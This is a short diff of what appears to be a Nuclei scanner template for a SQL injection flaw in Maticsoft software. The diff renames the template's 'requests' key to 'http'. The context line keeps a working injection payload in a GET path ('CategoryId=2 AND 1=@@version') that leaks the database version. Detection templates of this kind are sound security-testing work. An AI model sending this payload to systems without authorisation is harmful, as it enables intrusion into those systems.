@@ -6,7 +6,7 @@ info:
   severity: high
   tags: Maticsoft,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NodeProdCategory.aspx?action=GetChildNode&CategoryId=2%20AND%201=@@version"
